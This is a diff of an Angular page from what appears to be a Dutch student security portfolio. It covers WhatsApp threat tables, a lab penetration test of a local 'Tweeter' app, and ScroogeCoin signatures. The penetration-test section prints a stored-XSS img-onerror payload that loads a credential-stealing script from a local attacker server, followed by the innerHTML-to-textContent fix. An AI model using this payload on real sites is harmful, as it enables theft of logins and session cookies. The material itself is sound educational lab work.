@@ -12,11 +12,20 @@
       <a mat-list-item (click)="scroll(assignment1)">
         Opdracht 1
       </a>
+      <a mat-list-item (click)="scroll(assignment2)">
+        Opdracht 2
+      </a>
+      <a mat-list-item (click)="scroll(assignment3)">
+        Opdracht 3
+      </a>
+      <a mat-list-item (click)="scroll(assignment4)">
+        Opdracht 4
+      </a>
     </mat-nav-list>
   </mat-sidenav>
   <mat-sidenav-content>
     <div class="content">
-      <div #assignment1>
+      <div #assignment1 class="wrapper">
         <app-assignment-card
           title="Opdracht 1"
           subtitle="WhatsApp Deployment Diagram & DFDs"
@@ -38,6 +47,377 @@
               <img src="../assets/diagrams/DFD_Level0_(WhatsApp).png" />
             </div>
             <p class="mat-small caption">DFD Level 0</p>
+          </div>
+        </app-assignment-card>
+      </div>
+
+      <div #assignment2 class="wrapper">
+        <app-assignment-card
+          title="Opdracht 2"
+          subtitle="WhatsApp Threats & Mitigations"
+        >
+          <table
+            mat-table
+            [dataSource]="assignment2TableDataSource"
+            class="mat-elevation-z8"
+          >
+            <ng-container matColumnDef="threat">
+              <th mat-header-cell *matHeaderCellDef>Threat</th>
+              <td mat-cell *matCellDef="let element">{{ element.threat }}</td>
+            </ng-container>
+
+            <ng-container matColumnDef="title">
+              <th mat-header-cell *matHeaderCellDef>Title</th>
+              <td mat-cell *matCellDef="let element">{{ element.title }}</td>
+            </ng-container>
+
+            <ng-container matColumnDef="description">
+              <th mat-header-cell *matHeaderCellDef>Description</th>
+              <td mat-cell *matCellDef="let element">
+                {{ element.description }}
+              </td>
+            </ng-container>
+
+            <ng-container matColumnDef="location">
+              <th mat-header-cell *matHeaderCellDef>Location</th>
+              <td mat-cell *matCellDef="let element">{{ element.location }}</td>
+            </ng-container>
+
+            <ng-container matColumnDef="mitigation">
+              <th mat-header-cell *matHeaderCellDef>Mitigation</th>
+              <td mat-cell *matCellDef="let element">
+                {{ element.mitigation }}
+              </td>
+            </ng-container>
+
+            <tr
+              mat-header-row
+              *matHeaderRowDef="assignment2DisplayedColumns"
+            ></tr>
+            <tr
+              mat-row
+              *matRowDef="let row; columns: assignment2DisplayedColumns"
+            ></tr>
+          </table>
+        </app-assignment-card>
+      </div>
+
+      <div #assignment3 class="wrapper">
+        <app-assignment-card
+          title="Opdracht 3"
+          subtitle="Tweeter Penetration Test"
+        >
+          <p>
+            Opdracht 3 bevat twee node applicaties. Voordat deze uitgevoerd
+            kunnen worden, moet het commando “npm install” uitgevoerd worden in
+            de “assignment3” folder van het project.
+          </p>
+          <p>
+            In de “server” folder is de Tweeter applicatie te vinden. Deze
+            applicatie kan uitgevoerd worden door in de “server” folder het
+            commando “node index.js” uit te voeren. Vervolgens is de applicatie
+            beschikbaar in de browser op
+            <a href="http://localhost:3000">http://localhost:3000</a>. Om
+            berichten te kunnen versturen kan ingelogd worden met de username
+            “user1” met wachtwoord “password1”, of username “user2” en
+            wachtwoord “password2”.
+          </p>
+          <p>
+            In de “attacker” folder is een server te vinden die verantwoordelijk
+            is voor het serveren van schadelijke code en het ontvangen van
+            gestolen gebruikersgegevens. De applicatie kan uitgevoerd worden
+            door in de “attacker” folder het commando “node attacker.js” uit te
+            voeren.
+          </p>
+          <h3>Risicoanalyse</h3>
+          <div class="flexbox">
+            <div class="img-container">
+              <img src="../assets/diagrams/Assignment3_DFD_Level0.png" />
+            </div>
+            <p class="mat-small caption">Tweeter DFD Level 0</p>
+          </div>
+          <table
+            mat-table
+            [dataSource]="assignment3TableDataSource"
+            class="mat-elevation-z8"
+          >
+            <ng-container matColumnDef="threat">
+              <th mat-header-cell *matHeaderCellDef>Threat</th>
+              <td mat-cell *matCellDef="let element">{{ element.threat }}</td>
+            </ng-container>
+
+            <ng-container matColumnDef="title">
+              <th mat-header-cell *matHeaderCellDef>Title</th>
+              <td mat-cell *matCellDef="let element">{{ element.title }}</td>
+            </ng-container>
+
+            <ng-container matColumnDef="description">
+              <th mat-header-cell *matHeaderCellDef>Description</th>
+              <td mat-cell *matCellDef="let element">
+                {{ element.description }}
+              </td>
+            </ng-container>
+
+            <ng-container matColumnDef="location">
+              <th mat-header-cell *matHeaderCellDef>Location</th>
+              <td mat-cell *matCellDef="let element">{{ element.location }}</td>
+            </ng-container>
+
+            <ng-container matColumnDef="mitigation">
+              <th mat-header-cell *matHeaderCellDef>Mitigation</th>
+              <td mat-cell *matCellDef="let element">
+                {{ element.mitigation }}
+              </td>
+            </ng-container>
+
+            <tr
+              mat-header-row
+              *matHeaderRowDef="assignment3DisplayedColumns"
+            ></tr>
+            <tr
+              mat-row
+              *matRowDef="let row; columns: assignment3DisplayedColumns"
+            ></tr>
+          </table>
+
+          <h3>Penetration Test</h3>
+          <p>
+            Zodra een gebruiker is ingelogd, kan hij/zij een bericht verzenden
+            naar de webserver. De gebruiker heeft hier de mogelijkheid om
+            JavaScript te injecteren. Dit kan echter niet rechtstreeks door een
+            &lt;script&gt; tag te injecteren met schadelijke code. Scripts in de
+            DOM worden namelijk uitgevoerd zodra de pagina wordt verwerkt. Zodra
+            de pagina verwerkt is wordt deze geserveerd aan de gebruiker. Een
+            &lt;scripts&gt; tag die na het verwerken nog ge&iuml;njecteerd
+            wordt, zal niet worden uitgevoerd (Arora, 2014). Een attack die wel
+            werkt is het &ldquo;onError&rdquo; attribuut van een &lt;img&gt;
+            tag. De waardes van zogenaamde event handlers, zoals
+            &ldquo;onError&rdquo; worden nog wel uitgevoerd zodra de
+            bijbehorende events getriggerd worden (Arora, 2014). Wanneer een
+            image niet gevonden kan worden (de waarde in het &ldquo;src&rdquo;
+            attribuut is niet valide), wordt de waarde van het
+            &ldquo;onError&rdquo; attribuut uitgevoerd. De waarde van het
+            &ldquo;onError&rdquo; attribuut kan een script zijn (OWASP, XSS
+            Filter Evasion Cheat Sheet, 2018). Een gebruiker kan de volgende
+            code als message posten om een persistent XSS attack uit te voeren.
+          </p>
+          <pre>
+&lt;img src=/ onerror='with(top)body.appendChild (createElement(&quot;script&quot;)).src=&quot;http://localhost:4000/credentials.js&quot;'&gt;</pre
+          >
+          <p>
+            De hacker post de bovenstaande code als message naar de server. Deze
+            message wordt vervolgens door de server opgeslagen. Iedere andere
+            gebruiker die de berichten van de server opvraagt, krijgt vervolgens
+            dit bericht. De bovenstaande code, het bericht, wordt dus
+            weergegeven en getoond aan de gebruiker. De browser probeert een
+            image in te laden, maar het pad naar de image is niet valide,
+            waardoor de browser het schadelijke script in het
+            &ldquo;onError&rdquo; attribuut uitvoert. Het schadelijke script in
+            de &ldquo;onError&rdquo; voegt een nieuw HTML &lt;script&gt; element
+            toe aan de body van de DOM. Het &ldquo;src&rdquo; attribuut van het
+            &lt;script&gt; element verwijst naar het schadelijke JavaScript
+            bestand dat op de server draait van de hacker. Die code wordt
+            vervolgens uitgevoerd zodra het &ldquo;onError&rdquo; event wordt
+            uitgevoerd, wat immers altijd gebeurd aangezien de &ldquo;src&rdquo;
+            verwijst naar een niet bestaand image.
+          </p>
+          <p>
+            Het script credentials.js van de hacker overwrite de signIn functie.
+            Wanneer dit schadelijke script is uitgevoerd, zal de signIn functie
+            (die uitgevoerd wordt zodra een gebruiker inlogt) ook de
+            inloggegevens en cookie van de gebruiker versturen naar de server
+            van de hacker. Deze gegevens worden vervolgens in de console gelogd.
+            De hacker weet vervolgens de inloggegevens van een gebruiker, en kan
+            hier misbruik van maken.
+          </p>
+          <h3>Mitigation</h3>
+          <p>
+            Het probleem is dat de message die gebruiker posten, worden
+            ingeladen in de DOM via de volgende code:
+          </p>
+          <pre>
+listItem.innerHTML = "[" + message.user + "] : " + message.message;</pre
+          >
+          <p>
+            Het probleem is de functie “innerHTML”. Deze functie ondersteunt,
+            zoals de naam al zegt, het toevoegen van HTML. Indien de
+            “message.message” dus bestaat uit HTML, ziet de website dit ook als
+            HTML. Deze HTML wordt dan dus ook uitgevoerd. Indien
+            “message.message” dus de schadelijke code bevat uit het vorige
+            hoofdstuk (wat HTML bevat), dan wordt die ook uitgevoerd. We spreken
+            hier van XSS. De vorm van XSS is persistent, aangezien de
+            schadelijke code persistent wordt opgeslagen door de webserver.
+            Iedere gebruiker die de chat opent, en de berichten ontvangt, krijgt
+            ook de opgeslagen schadelijke code te zien. En bij iedere gebruiker
+            wordt deze schadelijke code ook uitgevoerd.
+          </p>
+          <p>
+            Om dit te voorkomen kan “innerHTML” vervangen worden door de functie
+            “textContent” of “innerText”. Deze twee methodes ondersteunen
+            namelijk geen HTML, maar enkel tekst. Indien “message.message” in
+            dit geval de schadelijke code bevat, ziet de browser dit als tekst.
+            De HTML wordt dus niet uitgevoerd en de schadelijke JavaScript kan
+            dus ook niet geïnjecteerd worden (OWASP, DOM Based XSS Prevention
+            Cheat Sheet, 2017).
+          </p>
+          <p>
+            Daarnaast kan input bij de server als aan de browser kant ook verder
+            gezuiverd worden door de betreffende input te escapen naar strings,
+            overal waar data wordt opgehaald uit de HTML, en waar data in de
+            HTML wordt gezet. Bovenstaande mitigation is hier een vorm van
+            (OWASP, DOM Based XSS Prevention Cheat Sheet, 2017).
+          </p>
+          <h3>Code Review</h3>
+          <div class="flexbox">
+            <div class="img-container">
+              <img src="../assets/checklist.PNG" />
+            </div>
+          </div>
+          <p>
+            Hierboven de relevante onderdelen van de OWASP Code Review checklist
+            getest. Het onderdeel dat vooral betrekking heeft op onze gebruikte
+            mitigation is het vijfde onderdeel, “Input Validation”. Untrusted
+            data wordt doormiddel van de mitigation gevalideerd op het type en
+            formaat. Zo kan er geen JavaScript geïnjecteerd worden, om XSS te
+            voorkomen. OWASP geeft echter aan dat er ook gevalideerd moet worden
+            op de lengte van data. Zo voorkom je een buffer overflow. Een buffer
+            overflow treedt op wanneer een programma meer gegevens naar een vast
+            geheugen blok probeert te schrijven, dan de hoeveelheid gegevens het
+            geheugen blok kan bevatten. Dit kan gebruikt worden voor XSS, hier
+            hebben wij echter een mitigation voor toegevoegd. Het kan echter ook
+            gebruikt worden voor een Denial of Service attack. Een buffer
+            overflow kan een programma namelijk laten crashen. Een mogelijke
+            mitigation is inderdaad de lengte van input data limiteren
+            (TechTarget, n.d.).
+          </p>
+          <p>
+            Enkele aanbevelingen is ten eerste het toepassen van input
+            validation op alle mogelijke plekken. Overal waar data in de HTML
+            wordt gezet, en eruit wordt gehaald. Daarnaast ook op de server waar
+            de data wordt weggeschreven naar een persistente opslag (laatste
+            onderdeel review). Beveiligde verbindingen (HTTPS) en encryptie van
+            cookie en inloggegevens zijn vanzelfsprekend aanbevelingen die voor
+            iedere applicatie van groot belang zijn.
+          </p>
+          <h3>Penetration Test 2</h3>
+          <p>
+            De applicatie is nu veilig tegen een persistent XSS-attack. Er zijn
+            echter nog vele andere bedreigingen waar de applicatie niet tegen
+            beveiligd is. Persistent XSS blijft ook altijd een bedreiging voor
+            het systeem. Een systeem is nooit helemaal veilig. Er kunnen
+            bedreigingen zitten in externe packages, of er kunnen bedreigingen
+            zijn die je over het hoofd ziet. Ook kunnen er in de toekomst nog
+            bedreigingen ontstaan, die nu nog niet bekend zijn, voor zowel de
+            white als black hat hackers.
+          </p>
+          <h3>References</h3>
+          <p>
+            Arora, R. (2014, juni 12). Why are scripts injected through
+            innerHTML not executed whilst onerror and other on&lt;event&gt;
+            attributes on elements are? - Google XSS Challenge 2. Opgehaald van
+            Security StackExchange:
+            <a
+              href="https://security.stackexchange.com/questions/60861/why-are-scripts-injected-through-innerhtml-not-executed-whilst-onerror-and-other"
+              >https://security.stackexchange.com/questions/60861/why-are-scripts-injected-through-innerhtml-not-executed-whilst-onerror-and-other</a
+            >
+          </p>
+          <p>
+            OWASP. (2017, november 25). DOM Based XSS Prevention Cheat Sheet.
+            Opgehaald van OWASP:
+            <a
+              href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet"
+              >https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</a
+            >
+          </p>
+          <p>
+            OWASP. (2018, April 7). XSS Filter Evasion Cheat Sheet. Opgehaald
+            van OWASP:
+            <a
+              href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet"
+              >https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a
+            >
+          </p>
+          <p>
+            TechTarget. (sd). Application attacks Definitions. Opgehaald van
+            TechTarget:
+            <a
+              href="https://searchsecurity.techtarget.com/definitions/Application-Attacks-Buffer-Overflows-Cross-Site-Scripting"
+              >https://searchsecurity.techtarget.com/definitions/Application-Attacks-Buffer-Overflows-Cross-Site-Scripting</a
+            >
+          </p>
+        </app-assignment-card>
+      </div>
+
+      <div #assignment4 class="wrapper">
+        <app-assignment-card title="Opdracht 4" subtitle="ScroogeCoin">
+          <h3>Opdracht 1</h3>
+          <div class="flexbox">
+            <div class="img-container">
+              <img src="../assets/diagrams/ScroogeCoin_UML_Diagram.png" />
+            </div>
+          </div>
+          <p>
+            De afkorting UTXO staat voor: Unspent Transaction Output. Het is de
+            output van een transacties die nog niet gebruikt is, in principe dus
+            de inhoud van je portemonnee. Wanneer je bijvoorbeeld een briefje
+            van 50, 20 en 5 in je portemonnee hebt zitten, kan dit vertaald
+            worden naar drie UTXO’s. Eén met de waarde 50, één met de waarde 20,
+            en de laatste met de waarde 5 (Daniel, 2018).
+          </p>
+          <h3>Opdracht 2</h3>
+          <div class="flexbox">
+            <div class="img-container">
+              <img src="../assets/diagrams/ScroogeCoin.png" />
+            </div>
+          </div>
+          <p>
+            De signature is de digest van het originele bericht, wat vervolgens
+            geencrypt is met de private key van de sender.
+          </p>
+          <p>
+            De signature wordt verkregen door het uitvoeren van de volgende
+            stappen:
+          </p>
+          <ol>
+            <li>De message (Transaction.Input) wordt gehasht.</li>
+            <li>
+              Deze digest wordt geëncrypt met de private key van de sender.
+            </li>
+          </ol>
+          <p>
+            Om integriteit en authenticiteit te waarborgen, kan de signature via
+            de volgende stappen geverifieerd worden:
+          </p>
+          <ol>
+            <li>
+              De signature kan gedecrypt worden met de public key van de sender.
+              Zo wordt authenticity gewaarborgd. We zijn er zeker van dat de
+              private key de signature heeft gemaakt. Het resultaat van de
+              decryptie is een digest van het originele bericht.
+            </li>
+            <li>
+              Vervolgens kan de ontvanger, het ontvangen bericht opnieuw hashen.
+              Het resultaat kan vergeleken worden met de digest die na decryptie
+              verkregen is. Indien ze gelijk zijn, is het bericht na het
+              ondertekenen niet meer aangepast. Zo is integriteit gewaarborgd.
+            </li>
+          </ol>
+          <p>
+            Het RSA-encryptiealgoritme is gebruikt voor de private/public keys.
+            Verder is SHA-256 gebruikt voor hashing.
+          </p>
+          <p>SHA-256 wordt ook gebruikt voor het hashen van de transactie.</p>
+          <p>
+            De input voor de transactie hash is de lijst met inputs, gevolgd met
+            de lijst van outputs, in de vorm van een byte array. Voor de public
+            keys van outputs worden de resultaten van de methodes getExponent()
+            en getModulus() meegenomen als input.
+          </p>
+          <h3>Opdracht 3</h3>
+          <div class="flexbox">
+            <div class="img-container">
+              <img src="../assets/diagrams/Alice_Bob_Scrooge.png" />
+            </div>
           </div>
         </app-assignment-card>
       </div>
